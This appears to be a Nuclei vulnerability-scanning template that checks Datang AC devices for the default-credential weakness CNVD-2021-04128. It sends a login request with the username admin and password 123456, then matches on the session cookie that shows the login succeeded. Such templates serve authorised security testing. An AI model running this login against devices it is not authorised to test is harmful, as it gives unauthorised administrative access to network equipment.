id: poc-datang-ac-default-password-cnvd-2021-04128

info:
  name: Datang AC Default Password Vulnerability (CNVD-2021-04128)
  author: ProjectDiscoveryAI
  severity: high
  tags: cnvd-2021-04128,default-password
  description: |
    Datang AC devices vulnerable to default credentials exploitation.

http:
  - raw:
      - |
        POST /login.cgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        user=admin&password1=%E8%AF%B7%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81&password=123456&Submit=%E7%AB%8B%E5%8D%B3%E7%99%BB%E5%BD%95
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "set-cookie"
          - "ac_userid=admin,ac_passwd="
      - type: regex
        part: body
        regex:
          - "window\\.open\\(\'index\\.htm\\?_"
